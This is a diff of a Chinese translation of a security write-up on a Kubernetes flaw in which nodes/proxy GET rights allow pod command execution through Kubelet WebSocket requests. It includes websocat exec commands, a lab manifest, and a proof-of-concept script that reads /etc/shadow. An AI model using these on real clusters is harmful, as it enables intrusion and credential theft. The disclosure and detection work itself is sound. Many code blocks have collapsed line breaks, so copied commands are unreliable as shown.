@@ -108,6 +108,7 @@ nodes/proxy GET
 - wiz-sec/sensor  
   
 以下 ClusterRole 显示了利用此漏洞所需的所有权限。  
+
 ```
 # Vulnerable ClusterRoleapiVersion: rbac.authorization.k8s.io/v1kind: ClusterRolemetadata:name: nodes-proxy-readerrules:  - apiGroups: [""]resources: ["nodes/proxy"]verbs: ["get"]
 ```  
@@ -115,6 +116,7 @@ nodes/proxy GET
 作为集群管理员，您可以使用此检测脚本检查集群中所有服务账户的此权限。  
   
 如果服务账户易受攻击，可以使用 websocat 等工具在集群中的所有 Pod 中运行命令：  
+
 ```
 websocat --insecure \  --header "Authorization: Bearer $TOKEN"\  --protocol v4.channel.k8s.io \"wss://$NODE_IP:10250/exec/default/nginx/nginx?output=1&error=1&command=id"uid=0(root) gid=0(root) groups=0(root)
 ```  
@@ -166,9 +168,11 @@ nodes/proxy
   
 可以使用 kubectl 的 --raw  
 标志或直接使用 curl 访问这些。例如，向指标端点发送请求会返回一些基本指标信息：  
+
 ```
 # with kubectlkubectl get --raw /api/v1/nodes/$NODE_NAME/proxy/metrics | head -n 10# Or with curlcurl -sk -H "Authorization: Bearer $TOKEN"$API_SERVER/api/v1/nodes/$NODE_NAME/proxy/metrics | head -n 10
 ```  
+
 ```
 # HELP aggregator_discovery_aggregation_count_total [ALPHA] Counter of number of times discovery was aggregated# TYPE aggregator_discovery_aggregation_count_total counteraggregator_discovery_aggregation_count_total 0# HELP apiserver_audit_event_total [ALPHA] Counter of audit events generated and sent to the audit backend.# TYPE apiserver_audit_event_total counterapiserver_audit_event_total 0# HELP apiserver_audit_requests_rejected_total [ALPHA] Counter of apiserver requests rejected due to an error in audit logging backend.# TYPE apiserver_audit_requests_rejected_total counterapiserver_audit_requests_rejected_total 0# HELP apiserver_client_certificate_expiration_seconds [ALPHA] Distribution of the remaining lifetime on the certificate used to authenticate a request.
 ```  
@@ -178,6 +182,7 @@ nodes/proxy
 资源生成审计日志。在记录的 pods/exec  
 请求中，注意 requestURI  
 字段会显示在 Pod 中执行的完整命令。  
+
 ```
 // Request generated via AuditPolicy{  "kind": "Event",  "apiVersion": "audit.k8s.io/v1",  "level": "Metadata",  "auditID": "196f4d69-6cfa-4812-b7b9-4bf13689cb8d",  "stage": "RequestReceived",  "requestURI": "/api/v1/namespaces/kube-system/pods/etcd-minikube/exec?command=sh&command=-c&command=filename%3D%2Fvar%2Flib%2Fminikube%2Fcerts%2Fetcd%2Fserver.key%3B+while+IFS%3D+read+-r+line%3B+do+printf+%22%25s%5C%5Cn%22+%22%24line%22%3Bdone+%3C+%22%24filename%22&container=etcd&stdin=true&stdout=true&tty=true",  "verb": "get",  "user": {    "username": "minikube-user",    "groups": [      "system:masters",      "system:authenticated"    ],    "extra": {      "authentication.kubernetes.io/credential-id": [        "X509SHA256=3da792d1a94c5205821984a672707270a9f2d8e27190eb09051b15448e5bf0c3"      ]    }  },  "sourceIPs": [    "192.168.67.1"  ],  "userAgent": "kubectl/v1.31.0 (linux/amd64) kubernetes/9edcffc",  "objectRef": {    "resource": "pods",    "namespace": "kube-system",    "name": "etcd-minikube",    "apiVersion": "v1",    "subresource": "exec"  },  "requestReceivedTimestamp": "2025-11-04T05:42:51.025534Z",  "stageTimestamp": "2025-11-04T05:42:51.025534Z"}
 ```  
@@ -187,12 +192,14 @@ nodes/proxy
 资源还授予对 Kubelet API 的直接访问。请记住，每个节点都有一个 Kubelet 进程负责告诉容器运行时要创建哪些容器。  
   
 Kubelet 公开了各种 API 端点，提供与 API 服务器代理类似的信息。例如，我们可以通过直接查询 Kubelet API 返回与之前相同的指标数据。  
+
 ```shell
 curl -sk -H "Authorization: Bearer $TOKEN" https://$NODE_IP:10250/metrics | head -n 10
 ```  
   
 **注意**  
 ：这里必须使用节点的 IP，而不是像通过 API Server 发起请求时那样使用节点名。  
+
 ```
 # HELP aggregator_discovery_aggregation_count_total [ALPHA] Counter of number of times discovery was aggregated# TYPE aggregator_discovery_aggregation_count_total counteraggregator_discovery_aggregation_count_total 0# HELP apiserver_audit_event_total [ALPHA] Counter of audit events generated and sent to the audit backend.# TYPE apiserver_audit_event_total counterapiserver_audit_event_total 0# HELP apiserver_audit_requests_rejected_total [ALPHA] Counter of apiserver requests rejected due to an error in audit logging backend.# TYPE apiserver_audit_requests_rejected_total counterapiserver_audit_requests_rejected_total 0# HELP apiserver_client_certificate_expiration_seconds [ALPHA] Distribution of the remaining lifetime on the certificate used to authenticate a request.
 ```  
@@ -201,6 +208,7 @@ curl -sk -H "Authorization: Bearer $TOKEN" https://$NODE_IP:10250/metrics | head
 日志，但**不**  
 记录 pods/exec  
 操作，防止我们看到在 Pod 中执行的完整命令。  
+
 ```
 {  "kind": "Event",  "apiVersion": "audit.k8s.io/v1",  "level": "Metadata",  "auditID": "1be86af9-26e7-40e9-aaae-bbb904df129b",  "stage": "ResponseComplete",  "requestURI": "/apis/authorization.k8s.io/v1/subjectaccessreviews",  "verb": "create",  "user": {    "username": "system:node:minikube",    "groups": [      "system:nodes",      "system:authenticated"    ],    "extra": {      "authentication.kubernetes.io/credential-id": [        "X509SHA256=52d652baad2bfd4d1fa0bb82308980964f8c7fbf01784f30e096accd1691f889"      ]    }  },  "sourceIPs": [    "192.168.67.2"  ],  "userAgent": "kubelet/v1.34.0 (linux/amd64) kubernetes/f28b4c9",  "objectRef": {    "resource": "subjectaccessreviews",    "apiGroup": "authorization.k8s.io",    "apiVersion": "v1"  },  "responseStatus": {    "metadata": {},    "code": 201  },  "requestReceivedTimestamp": "2025-11-04T05:54:54.978676Z",  "stageTimestamp": "2025-11-04T05:54:54.979425Z",  "annotations": {    "authorization.k8s.io/decision": "allow",    "authorization.k8s.io/reason": ""  }}
 ```  
@@ -296,6 +304,7 @@ nodes/proxy
 授予对命令执行端点的写访问权限。  
   
 在本讨论中，我将使用具有以下 ClusterRole 的服务账户。  
+
 ```
 apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRolemetadata:name: nodes-proxy-readerrules:  - apiGroups: [""]resources: ["nodes/proxy"]verbs: ["get"]
 ```  
@@ -317,6 +326,7 @@ apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRolemetadata:name: nodes-pr
 这意味着在任何 WebSocket 连接建立中发送的初始请求是带有 Connection: Upgrade  
 头的 HTTP GET  
 ：  
+
 ```http
 GET /exec HTTP/1.1Host: example.comUpgrade: websocketConnection: Upgrade<snip>
 ```  
@@ -333,9 +343,11 @@ Kubelet 缺少在连接请求升级后的授权检查，并且在使用 WebSocke
   
 为了演示这一点，让我们检查我们的权限，以确保我们仅对此服务账户分配了 nodes/proxy GET  
 权限。  
+
 ```
 kubectl auth can-i --list
 ```  
+
 ```
 Resources                                       Non-Resource URLs                      Resource Names   Verbsselfsubjectreviews.authentication.k8s.io        []                                     []               [create]selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]                                                [/.well-known/openid-configuration/]   []               [get]                                                [/.well-known/openid-configuration]    []               [get]                                                [/api/*]                               []               [get]                                                [/api]                                 []               [get]                                                [/apis/*]                              []               [get]                                                [/apis]                                []               [get]                                                [/healthz]                             []               [get]                                                [/healthz]                             []               [get]                                                [/livez]                               []               [get]                                                [/livez]                               []               [get]                                                [/openapi/*]                           []               [get]                                                [/openapi]                             []               [get]                                                [/openid/v1/jwks/]                     []               [get]                                                [/openid/v1/jwks]                      []               [get]                                                [/readyz]                              []               [get]                                                [/readyz]                              []               [get]                                                [/version/]                            []               [get]                                                [/version/]                            []               [get]                                                [/version]                             []               [get]                                                [/version]                             []               [get]nodes/proxy                                     []                                     []               [get]
 ```  
@@ -343,9 +355,11 @@ Resources                                       Non-Resource URLs               
 确认我们仅对此服务账户具有 nodes/proxy GET  
 权限后，我们可以使用 websocat 直接向 Kubelet 的 /exec  
 端点发送 WebSocket 请求。  
+
 ```
 websocat \  --insecure \  --header "Authorization: Bearer $TOKEN"\  --protocol "v4.channel.k8s.io"\"wss://$NODE_IP:10250/exec/default/nginx/nginx?output=1&error=1&command=hostname"
 ```  
+
 ```
 nginx{"metadata":{},"status":"Success"}
 ```  
@@ -359,9 +373,11 @@ nginx{"metadata":{},"status":"Success"}
 相比之下，当使用 POST（映射到 RBAC CREATE  
 动词）请求到同一 /exec  
 端点时，请求被拒绝。  
+
 ```shell
 curl -sk -X POST \  -H "Authorization: Bearer $TOKEN"\"https://$NODE_IP:10250/exec/default/nginx/nginx?command=hostname&stdout=true&stderr=true"
 ```  
+
 ```
 Forbidden (user=system:serviceaccount:default:attacker, verb=create, resource=nodes, subresource(s)=[proxy])
 ```  
@@ -426,6 +442,7 @@ Forbidden (user=system:serviceaccount:default:attacker, verb=create, resource=no
 构造授权记录。这是它将对照 RBAC 策略检查的内容 (auth.go:136)  
   
 这个记录大致会是这样：  
+
 ```
 authorizer.AttributesRecord{    User:            system:serviceaccount:default:attacker,    Verb:            "get",    Namespace:       "",    APIGroup:        "",    APIVersion:      "v1",    Resource:        "nodes",    Subresource:     "proxy",    Name:            "minikube-m02",    ResourceRequest: true,    Path:            "/exec/default/nginx/nginx",}
 ```  
@@ -553,6 +570,7 @@ authorizer.AttributesRecord{    User:            system:serviceaccount:default:a
 ![](https://mmbiz.qpic.cn/mmbiz_gif/hoiaQy7WhTCPfW0EB7O0QSynJ8wXGtoYEP9frgGxOROyne23opiazy7bhOVCSJLlb4utcsnTFfQ9ESmRCB69GI7Q/640?wx_fmt=gif&from=appmsg "")  
   
 这是一个快速概念验证脚本，可以用来尝试。  
+
 ```
 #!/bin/bash# ColorsRED=$(tput setaf 1)BLUE=$(tput setaf 4)YELLOW=$(tput setaf 3)GREEN=$(tput setaf 2)ENDCOLOR=$(tput sgr0)TICK="[${GREEN}+${ENDCOLOR}] "TICK_MOVE="[${GREEN}~>${ENDCOLOR}] "TICK_BACKUP="[${GREEN}<~${ENDCOLOR}] "TICK_INPUT="[${YELLOW}!${ENDCOLOR}] "TICK_ERROR="[${RED}!${ENDCOLOR}] "# ConfigNODE_IP="${NODE_IP:?NODE_IP not set}"TOKEN="${TOKEN:?TOKEN not set}"NAMESPACE="${NAMESPACE:-default}"POD="${POD:-nginx}"CONTAINER="${CONTAINER:-nginx}"exec_cmd() {local cmd="$1"local args=""forargin$cmd;do        args+="&command=$arg"done    args="${args:1}"# strip leading &    timeout 3 websocat --insecure -E \        --header "Authorization: Bearer $TOKEN"\        --protocol v4.channel.k8s.io \"wss://$NODE_IP:10250/exec/$NAMESPACE/$POD/$CONTAINER?output=1&error=1&$args"2>/dev/null \| grep -v '{"metadata":{}'}echo""echo"${TICK}Target: ${YELLOW}$NODE_IP:10250 ${ENDCOLOR}"echo"${TICK}Pod: ${YELLOW}$NAMESPACE/$POD${ENDCOLOR}"echo""echo"${TICK_MOVE}Fetching hostname..."hostname=$(exec_cmd "cat /etc/hostname" | tr -d '\n\r')echo"${TICK}Hostname: ${GREEN}$hostname${ENDCOLOR}"echo""echo"${TICK_MOVE}Fetching identity..."identity=$(exec_cmd "id")echo"${TICK}Identity: ${GREEN}$identity${ENDCOLOR}"echo""echo"${TICK_MOVE}Attempting to read /etc/shadow..."shadow=$(exec_cmd "cat /etc/shadow")if [[ -n"$shadow" ]];thenecho"${TICK}${RED}Successfully read /etc/shadow:${ENDCOLOR}"echo"$shadow"elseecho"${TICK_ERROR}Could not read /etc/shadow"fi
 ```  
@@ -566,6 +584,7 @@ Online walkthrough
 在线演练（Online walkthrough）  
   
 如果您想在本地测试，这是一个最小的清单来入门。  
+
 ```
 ---apiVersion: v1kind: ServiceAccountmetadata:name: attackernamespace: default---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRolemetadata:name: nodes-proxy-readerrules:  - apiGroups: [""]resources: ["nodes/proxy"]verbs: ["get"]---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRoleBindingmetadata:name: attacker-nodes-proxy-readersubjects:  - kind: ServiceAccountname: attackernamespace: defaultroleRef:kind: ClusterRolename: nodes-proxy-readerapiGroup: rbac.authorization.k8s.io---apiVersion: v1kind: Podmetadata:name: attackernamespace: defaultspec:serviceAccountName: attackercontainers:    - name: attackerimage: alpinecommand: ["sleep", "infinity"]---apiVersion: v1kind: Podmetadata:name: nginxnamespace: defaultspec:containers:    - name: nginximage: nginx
 ```  
@@ -610,6 +629,7 @@ Online walkthrough
 资源。Kubernetes v1.35 通过添加二级授权检查修复了这个之前报告的问题，该检查明确验证 CREATE 动词，无论 HTTP 方法如何。  
   
 讨论修复的注释明确说明这是一个意外的副作用。  
+
 ```
 // Pod subresources differs on the REST verbs depending on the protocol used// SPDY uses POST that at the authz layer is translated to "create".// Websockets uses GET that is translated to "get".// Since the defaulting to websocket for kubectl in KEP-4006 this caused an// unexpected side effect and in order to keep existing policies backwards// compatible we always check that the "create" verb is allowed.// Ref: https://issues.k8s.io/133515
 ```  
@@ -625,14 +645,17 @@ Online walkthrough
 为了演示，让我们尝试使用 API 服务器代理路径运行 hostname  
 。注意我们指示 curl 将其作为 POST  
 请求发送。发送的请求将如下所示：  
+
 ```http
 POST /api/v1/nodes/minikube-m02/proxy/exec/default/nginx/nginx?command=hostname&stdout=true HTTP/2Host: 10.96.0.1User-Agent: curl/8.5.0Accept: */*Authorization: Bearer $TOKEN
 ```  
   
 使用 curl 发送请求：  
+
 ```shell
 curl -sk -X POST \  -H "Authorization: Bearer $TOKEN" \  "$APISERVER/api/v1/nodes/$NODE_NAME/proxy/exec/default/nginx/nginx?command=hostname&stdout=true"
 ```  
+
 ```
 {  "kind": "Status",  "apiVersion": "v1",  "metadata": {},  "status": "Failure",  "message": "nodes \"minikube-m02\" is forbidden: User \"system:serviceaccount:default:attacker\" cannot create resource \"nodes/proxy\" in API group \"\" at the cluster scope",  "reason": "Forbidden",  "details": {    "name": "minikube-m02",    "kind": "nodes"  },  "code": 403
 ```  
@@ -645,9 +668,11 @@ curl -sk -X POST \  -H "Authorization: Bearer $TOKEN" \  "$APISERVER/api/v1/node
 现在让我们通过直接连接到 Kubelet 来尝试在同一 Pod 中运行 hostname  
 ，使用 WebSocket。记住，WebSocket 使用 HTTP GET  
 进行初始握手：  
+
 ```
  websocat \  --insecure \  --header "Authorization: Bearer $TOKEN" \  --protocol "v4.channel.k8s.io" \  "wss://$NODE_IP:10250/exec/default/nginx/nginx?output=1&error=1&command=hostname"
 ```  
+
 ```
 nginx{"metadata":{},"status":"Success"}
 ```  
@@ -700,6 +725,7 @@ KEP-2862 提议**添加**
   
 Kubelet 的 auth.go  
 已经将特定路径映射到专用子资源：  
+
 ```
     switch {    case isSubpath(requestPath, statsPath):        subresources = append(subresources, "stats")    case isSubpath(requestPath, metricsPath):        subresources = append(subresources, "metrics")    case isSubpath(requestPath, logsPath):        // "log" to match other log subresources (pods/log, etc)        subresources = append(subresources, "log")    case isSubpath(requestPath, checkpointPath):        subresources = append(subresources, "checkpoint")    case isSubpath(requestPath, statusz.DefaultStatuszPath):        subresources = append(subresources, "statusz")    case isSubpath(requestPath, flagz.DefaultFlagzPath):        subresources = append(subresources, "configz")    default:        subresources = append(subresources, "proxy")    }
 ```  
